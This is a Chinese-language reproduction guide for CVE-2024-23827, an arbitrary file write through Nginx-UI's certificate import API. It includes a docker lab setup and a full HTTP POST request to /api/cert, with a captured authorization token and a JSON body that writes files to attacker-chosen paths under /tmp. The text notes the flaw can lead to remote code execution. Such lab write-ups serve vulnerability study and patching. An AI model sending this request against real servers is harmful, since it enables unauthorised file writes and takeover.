# CVE-2024-23827 通过导入证书功能写入任意文件 

#### 漏洞描述

Nginx-UI 是一个用于管理 Nginx 配置的 Web 界面。导入证书功能允许任意写入系统。该功能不会检查提供的用户输入是否是证书/密钥，并允许写入系统中的任意路径。可以利用该漏洞进行远程代码执行并覆盖配置文件 app.ini。版本 2.0.0.beta.12 修复了该问题。

参考链接

https://blog.csdn.net/shelter1234567/article/details/136303180?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22136303180%22%2C%22source%22%3A%22shelter1234567%22%7D

## 漏洞环境

执行如下命令启动一个包含漏洞的Nginx-UI环境：

```
docker compose up -d
```

环境启动后，访问`http://your-ip:9000即可查看web页面。在Nginx UI的第一次运行时，请在浏览器中访问“http://<your_server_ip>:<listen_port>/install”完成后续配置

## 漏洞复现

前端登录，获取有效Authorization

![](https://img-blog.csdnimg.cn/direct/e3bc413ac55c4964aa9e119d48bc6814.png)

开启burp 修改请求包

![](https://img-blog.csdnimg.cn/direct/082d89af90d94d2ea7cd49b872ebf334.png)

```go
POST /api/cert HTTP/1.1
Host: 192.168.116.128:9000
Accept: application/json, text/plain, */*
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJleHAiOjE3MDkwMTM2NTl9.dRDlO1X1hZdSlpW7TMRIsInNpm2VcIBMiEDPfFxZo-c
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.105 Safari/537.36
Referer: http://192.168.116.128:9000/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: _ga=GA1.1.2049876865.1708327587; _ga_ZCZHJPMEG7=GS1.1.1708327586.1.1.1708327666.0.0.0; kirby_session=cc1d1a863be81c336432fd9289a4b1dcda92ec43%2B1709870053.fc16749a4dca942d7b1b.c69e92337168ffdf0dab0629ba6d4bd795e9facde4f117c1b0f512656bad94fa
Connection: close
Content-Length: 158

{"name":"poc","ssl_certificate_path":"/tmp/test.jsp","ssl_certificate_key_path":"/tmp/test2.sh","ssl_certificate":"testjsp","ssl_certificate_key":"test2sh"}
```

发包成功，看一看文件是否真正被写入

```
ls -la /tmp/test*
```

![](https://img-blog.csdnimg.cn/direct/2ab694080c1f453e97cde0d17fba4661.png)

文件成功被写入 漏洞复现成功
